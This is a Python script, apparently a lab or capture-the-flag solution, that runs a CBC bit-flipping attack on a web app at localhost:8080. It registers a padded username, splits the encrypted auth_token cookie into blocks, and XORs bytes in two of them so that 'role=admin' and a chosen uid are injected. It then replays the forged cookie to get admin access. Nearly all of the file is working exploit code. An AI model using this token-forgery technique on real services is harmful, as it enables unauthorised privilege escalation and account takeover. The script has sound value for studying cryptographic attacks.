import requests
import string

homeURL = 'http://localhost:8080'
regesterURL = 'http://localhost:8080/register'

session = requests.Session()
userpadding = "yyyyyyyyyyy"
paddingRole = "XxxxxXxxxxxxxxxx"
paddingUID = "XxxxXxxxxxxxxxxx"
role = "admin"
uid = "AuidE1"

username = userpadding + paddingRole + "AroleE" + role + "yyyyy" + paddingUID + uid + "yyyyyyyyyy"
# print(len(username))
print(username)

# xor out content and xor in what we want 
uidAtBlockEnd = {"user" : username, "password" : "password"}
session.post(regesterURL, data=uidAtBlockEnd)
session.post(homeURL, data=uidAtBlockEnd)

requests.get('http://localhost:8080/home')
cookie = session.cookies.get_dict().get('auth_token')
print((cookie))
print()


cookieLst = [cookie[i:i+32] for i in range(0, len(cookie), 32)]
print((cookieLst))
print()

# need to xor idx 0 and idx 5
paddingOne = bytearray.fromhex(cookieLst[1])
# paddingOne[0] = ((ord('X')) ^ (ord('&'))) ^ paddingOne[0]
# paddingOne[5] = ((ord('X')) ^ (ord('='))) ^ paddingOne[5]
print(paddingOne)
print(paddingOne[0])
paddingOne[0] = (paddingOne[0] ^ ord('A')) ^ (ord('&'))
paddingOne[5] = (paddingOne[5] ^ ord('E')) ^ (ord('='))
paddingOne = paddingOne.hex()

cookieLst[1] = paddingOne

# need to xor idx 0 and idx 4
paddingTwo = bytearray.fromhex(cookieLst[3])
# paddingTwo[0] = (ord('X')) ^ ord('&') ^ paddingTwo[0]
# paddingTwo[4] = (ord('X')) ^ (ord('=')) ^ paddingTwo[4]
paddingTwo[0] = (paddingTwo[0] ^ ord('A')) ^ (ord('&'))
paddingTwo[4] = (paddingTwo[4] ^ ord('E')) ^ (ord('='))
paddingTwo = paddingTwo.hex()

cookieLst[3] = paddingTwo

print(len(cookieLst))

adminCookie = "".join(cookieLst)

print(adminCookie)

session.cookies.set('auth_token', adminCookie)
result = session.get('http://localhost:8080/home')
# print(result.text)